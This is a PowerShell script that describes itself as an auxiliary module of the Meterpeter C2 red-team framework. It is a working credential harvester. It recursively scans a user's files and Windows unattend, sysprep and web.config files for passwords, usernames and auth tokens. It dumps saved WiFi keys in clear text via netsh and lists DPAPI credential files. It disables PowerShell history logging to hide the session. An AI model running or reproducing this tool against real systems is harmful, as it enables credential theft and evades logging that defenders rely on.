<#
.SYNOPSIS
   Search for Strings\Regex inside files

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.12

.DESCRIPTION
   Auxiliary module of Meterpeter C2 that searchs for matching
   strings inside files recursive starting in input directory.

.NOTES
   Cmdlet displays the LineNumber where the strings have been found.
   Param -verb does not display file content if bigger than 300 lines.
   Param -Exclude '.txt' will add one more exclusion to the default list.
   Use | (pipe) command to split Strings\Regex (example: .txt|.ini|.bat).

   Regex examples:
   Cmdlet by default limmit the string to capture to 22 chars length but
   that can be changed by invoking -StrLength parameter to defined length.

   Regex examples:
   Only grab passwords with 22 chars max length
   (^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)
     
.Parameter Path
   The directory where to start search recursive (default: $Env:USERPROFILE)

.Parameter String
   String or Regex (regex: ^(\s+U|U)ser.{0,6}(=|:)|^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:)|login.{0,2}(=|:))

.Parameter Exclude
   File extension to exclude (example: .zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg)

.Parameter Verb
   Verbose output displays the file contents (default: false)

.Parameter StrLength
   The string to capture max length in chars (default: 22)

.Parameter StopAt
   Stop searching after found xxx results (default: 100)

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:USERPROFILE" -String "[^$]password="
   Search for string 'password=' on %userprofile% files recursive

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "pass=|passwd=|password="
   Search for string 'pass= passwd= password=' on %temp% files recursive

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:USERPROFILE" -String "passw=" -Exclude ".txt"
   Search for string 'passw=' on %userprofile% files (without .txt extension) recursive.

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "User.{0,4}(=|:)|passw.{0,3}(=|:)"
   Strings 'passw=,passw:,passwo=,passwor=,password=,user=,usern=,userna=,usernam=,username='

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "(`"password`":.{0,22})$" -stopAt "10"
   Search for 10 strings max with "password":+{0 to 22 chars} recursive starting in %tmp% dir

.INPUTS
   None. You cannot pipe objects into Find-string.ps1

.OUTPUTS
   * Find strings inside files
     => Total of files to scan: [19]

     TokenId     : [[1]]
     FileName    : creds.txt
     FullPath    : C:\Users\pedro\AppData\Local\Temp\creds.txt
     StringMatch : user=pedroUbuntu password=r00t3xp10it
     LineNumber  : 10

     TokenId     : [[2]]
     FileName    : logins.log
     FullPath    : C:\Users\pedro\AppData\Local\Temp\logins.log
     StringMatch : UserName: Teams passw = r00tPassWd
     LineNumber  : 2 4

   Scan compleated in '00:00:01' time length.
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://regexone.com/lesson/introduction_abcs
   https://towardsdatascience.com/regular-expressions-clearly-explained-with-examples-822d76b037b4
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$String="(^(\s+U|U)ser.{0,6}(=|:).[^$]{0,22}$)|(^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)|(^(\s+p|p)wd.{0,2}(=|:).{0,22}$)|(log(i|o)n.{0,2}(=|:).[^$]{0,22}$)",
   [string]$Exclude=".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.ico|.wav|.avi",
   [string]$Path="$Env:USERPROFILE",
   [string]$Verb="false",
   [int]$StrLength='22',
   [int]$StopAt='100',
   [int]$Limmit='300'
)


$DSetting = "false"
$CmdletVersion = "v1.0.12"
$ScanStartTimer = (Get-Date)
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Find-String $CmdletVersion {SSA@RedTeam}"


## Make sure input dir exists
If(-not(Test-Path -Path "$Path"))
{
   write-host "`n  Error: cmdlet cant find the input directory.`n" -ForegroundColor Red
   return
}

## Scanning root directory its forbiden
If($Path -iMatch '(^(C(:|:\\))$|^(C:\\Window(s|s\\))$)')
{
   write-host "`n  Error: cmdlet cant scan input directory root." -ForegroundColor Red
   write-host "  Try again or go further down in the diretory tree`n" -ForegroundColor Red
   return
}

## Make sure user input (-exclude) does not match any extensions in default list
If($Exclude -iNotMatch ".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.ico|.wav|.avi")
{
   ## check if user inputed command
   # it starts with a pipe (|) char
   If($Exclude -NotMatch '^(\|)')
   {
      ## Add Pipe to user input string
      $Exclude = "|"+"$Exclude" -join ''
   }

   ## Adding one more extension exclusion to cmdlet default exclusion list
   $Exclude = ".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.ico|.wav|.avi"+"$Exclude" -join ''
}

If($Path -iMatch '^(C:\\Windows\\.)')
{
   ## System directory exclusions groups
   # This will reduce system directorys scan time
   $Exclude = "$Exclude"+"|.NLS|.table|.scr|.msc|.cpl|.cat|.cab|.mui|.evtx" -join ''
}


## Store all file names fullpaths found (recursive search)
$Exclude = "$Exclude"+"|.SC2Replay|.SC2Save|Battle.net|Games|GameLogs" -join ''
$FileNames = (Get-ChildItem -Path "$Path" -Recurse -EA SilentlyContinue | Where-Object {
   $_.PsIsContainer -NotMatch '^(True)$' -and $_.Name -iNotMatch "($Exclude)"
}).FullName


## Count how many files have been found inside dir
$FilesCounter = (echo $FileNames|Measure-Object).Count
write-host "`n* Find strings inside files" -ForegroundColor Green

## Check if string match the cmdlet default string in the end.
If($String -Match '(0\)n\.\{0,2\}\(=|:\)\.\[\^\$\]\{0,22\}\$\))$')
{
   ## Add new groups to default string because meterpeter C2 cant
   # escape the backticks [`] that are escaping the double quotes ["] in this Regex
   $String = "$String" + "|((cp|p)ass.{0,4}`":.{0,22}$)|(Username`":.{0,22}$)|(`"Auth_token`":)" -join ''
}

## Define string to capture max length (xx chars)
$String = $String -replace "0,22","0,${StrLength}"


## Verbose outputs (-verb true)
If($Verb -iNotMatch '^(false)$')
{
   write-host "  => " -ForegroundColor DarkYellow -NoNewline
   write-host "StartPath: '" -NoNewline
   write-host "$Path" -ForegroundColor Magenta -NoNewline
   write-host "'"
   write-host "  =>" -ForegroundColor DarkYellow -NoNewline
   write-host " StrLength:" -NoNewline
   write-host "$StrLength" -ForegroundColor DarkYellow -NoNewline
   write-host "[chars]  Limmit:" -NoNewline
   write-host "$Limmit" -ForegroundColor DarkYellow -NoNewline
   write-host "[lines]  StopAfter:" -NoNewline
   write-host "$StopAt" -ForegroundColor DarkYellow -NoNewline
   write-host "[matches]"

   ## Check if user is using Regex
   If($String -Match '(\^|\||{|})')
   {
      write-host "  => " -ForegroundColor DarkYellow -NoNewline
      write-host "Regex: " -NoNewline
      write-host "($String)" -ForegroundColor Magenta   
   }
   Else
   {
      write-host "  => " -ForegroundColor DarkYellow -NoNewline
      write-host "String: " -NoNewline
      write-host "($String)" -ForegroundColor DarkYellow
   }


   $Creds = $null
   ## Dump WiFi SSIDnames\Credentials
   $Profiles = $(netsh wlan show profiles|findstr "Profile ")
   $parsedata = $Profiles -replace '\s*All User Profile\s*: ',''
   ForEach($Item in $parsedata)
   {
      $Creds += $(netsh wlan show profiles name=$Item key=clear|findstr "SSID Content"|findstr /V "Number")
   }

   If($Creds -ne $null)
   {
      ## Display Key contents OnScreen
      write-host "`n     WiFi credentials" -ForegroundColor Green
      $My_display = $Creds -replace '"','' -replace '^(\s*)','     ' -replace ' name\s*:',' :'
      $FinalTable = $My_display -replace ' Content\s*:','  :' -replace 'key','password' -replace 'SSID','SSID_name'
      echo $FinalTable
   }


   ## Dump DPAPI master keys
   $Dpapi1 = (Get-ChildItem -Path "$Env:APPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
   $Dpapi2 = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
   If($Dpapi1 -ne $null -or $Dpapi2 -ne $null)
   {
      write-host "`n     DPAPI master keys" -ForegroundColor Green
      $Dpapi1 -replace '^.','     '
      $Dpapi2 -replace '^.','     '
   }

   write-host ""
   Start-Sleep -Milliseconds 1500
}


$FilesCounter = $FilesCounter + 6
## Print OnScreen the number of files found
write-host "  => " -ForegroundColor DarkYellow -NoNewline
write-host "Total of files to scan: [" -NoNewline
write-host "$FilesCounter" -ForegroundColor DarkYellow -NoNewline
write-host "]`n"


## IIS web server (web.config) credential dump
$FileNames += "$Env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"
## Append XML file paths to current paths list
$FileNames += "$Env:WINDIR\Panther\Unattend\Unattend.xml"
$FileNames += "$Env:WINDIR\system32\sysprep\sysprep.xml"
$FileNames += "$Env:WINDIR\system32\sysprep.inf"
$FileNames += "$Env:WINDIR\Panther\Unattend.xml"
$FileNames += "$Env:WINDIR\sysprep\sysprep.inf"
$FileNames += "$Env:WINDIR\sysprep\sysprep.xml"
If($Verb -iMatch '^(true)$'){Start-Sleep -Seconds 1}


$i = 0 #Success counter
## Loop trougth all filenames
ForEach($Token in $FileNames)
{
   ## Search for strings or regex inside file
   $MatchedString = (Get-Content -Path "$Token"|Select-String -Pattern "($String)" -EA SilentlyContinue)
   If($MatchedString -iMatch "$String")
   {
      ## Get filename description
      $Description = (Get-ChildItem -Path "$Token"|Select-Object *)
      If($Verb -iMatch '^(true)$'){$FileContents = Get-Content -Path "$Token"}
      $Name = $Description.PSChildName
      $Line = $MatchedString.LineNumber
      $Full = $Description.FullName
         $i = $i + 1

      ## Print results OnScreen
      write-host "`n  TokenId      : [[" -NoNewline
      write-host "$i" -ForegroundColor Blue -NoNewline
      write-host "]]"
      write-host "  FileName     : $Name"
      write-host "  FullPath     : $Full"
      write-host "  StringMatch  : " -NoNewline
      write-host "$MatchedString" -ForegroundColor DarkGreen
      write-host "  LineNumber   : " -NoNewline
      write-host "$Line" -ForegroundColor DarkYellow

      ## Verbose outputs (contents)
      If($Verb -iMatch "^(true)$")
      {
         ## Check file length limmit
         If($Description.Length -lt $Limmit)
         {
            ## verbose displays file contents
            write-host "  FileContents : `n"
            echo $FileContents
         }
         Else
         {
            write-host "  FileContents : "-NoNewline
            write-host "[Limmit:$Limmit] "-NoNewline -ForegroundColor Yellow
            write-host "Invoke a bigger -limmit to display file .." -ForegroundColor Red
         }
      }

      write-host ""
      If($i -eq $StopAt)
      {
         $DSetting = "true"
         ## Stop after xx good results helps
         # in reducing the cmdlet scan time.
         write-host "`n[" -NoNewline
         write-host "$StopAt" -ForegroundColor Blue -NoNewline
         write-host "] success results reached, abort .."
         break
      }
      Start-Sleep -Milliseconds 800
   }
   Else
   {
      If($Verb -iMatch '^(true)$')
      {
         ## Display files flagged as [clean]
         write-host "  ScanningFile : " -NoNewline
         write-host "$Token" -ForeGroundColor Red -NoNewline
         write-host " [clean]"
      }   
   }
}


## Scan timmer
Start-Sleep -Milliseconds 500
If($DSetting -eq "false"){write-host "`n"}
$ElapsTime = $(Get-Date) - $ScanStartTimer
$TotalTime = "{0:HH:mm:ss}" -f ([datetime]$ElapsTime.Ticks)
If($i -lt 1)
{
   Write-Host "  Scan compleated in '" -NoNewline
}
Else
{
   Write-Host "Scan compleated in '" -NoNewline
}
Write-Host "$TotalTime" -ForegroundColor Green -NoNewline
Write-Host "' time length."

If($i -lt 1)
{
   write-host "  Error: fail to find any strings inside current directory.`n" -ForegroundColor Red
}
write-host ""
